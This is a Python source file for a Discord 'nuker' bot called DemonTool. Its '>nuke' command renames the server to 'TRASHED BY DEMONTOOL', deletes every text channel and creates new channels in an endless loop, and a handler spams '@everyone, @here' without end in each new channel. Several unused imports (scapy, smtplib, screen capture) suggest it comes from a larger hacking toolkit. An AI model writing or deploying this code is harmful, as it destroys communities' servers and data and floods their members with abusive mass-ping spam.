import os
from time import localtime, strftime, sleep
import colorama
import smtplib
import sys
import requests
import socket
from PIL import ImageGrab
import discord
from discord.ext import commands
from gtts import gTTS
from scapy.all import *
from pystyle import Colors
from colorama import Fore, Back, Style

colorama.init(autoreset=True)

client = commands.Bot(command_prefix='>', intents=discord.Intents.all())

def print_logo():
    logo = r'''
        ______                           _   _       _        
        |  _  \                         | \ | |     | |       
        | | | |___ _ __ ___   ___  _ __ |  \| |_   _| | _____ 
        | | | / _ \ '_ ` _ \ / _ \| '_ \| . ` | | | | |/ / _ \
        | |/ /  __/ | | | | | (_) | | | | |\  | |_| |   <  __/
        |___/ \___|_| |_| |_|\___/|_| |_\_| \_/\__,_|_|\_\___|
    '''
    print(Fore.LIGHTMAGENTA_EX + Fore.MAGENTA + logo + Style.RESET_ALL)

@client.event
async def on_ready():
    print_logo()
    print('Logged in as {}'.format(client.user))

@client.command()
async def nuke(ctx):
    try:
        await ctx.guild.edit(name="TRASHED BY DEMONTOOL")
        for channel in ctx.guild.text_channels:
            try:
                await channel.delete()
                print("Deleted {}".format(channel))
            except Exception as e:
                print("Can't delete {}: {}".format(channel, e))

        await ctx.guild.create_text_channel("DemonTool OP")
    except Exception as e:
        print("Error: {}".format(e))

    while True:
        await ctx.guild.create_text_channel("DemonTool OP")

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send('@everyone, @here')

client.run("TOKEN_HERE")
